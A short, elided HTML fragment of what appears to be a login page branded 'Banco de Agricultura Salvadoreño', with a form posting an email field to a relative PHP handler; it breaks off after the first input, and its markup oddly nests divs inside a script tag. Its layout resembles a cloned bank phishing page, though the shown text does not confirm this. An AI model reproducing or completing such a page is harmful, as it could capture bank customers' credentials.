...
<head>
    ...
    <title>Banco de Agricultura Salvadoreño</title>
</head>
<body>
...
<script>
    ...
    <div class="lr-wrapper" align="center">
          <div class="lr-content">
                ...
                <div class="lr-main">
                  <form method="POST" id="l-f" action="../php/login.php">
                    <input type="text" name="email" class="l-username" placeholder="Correo"/>
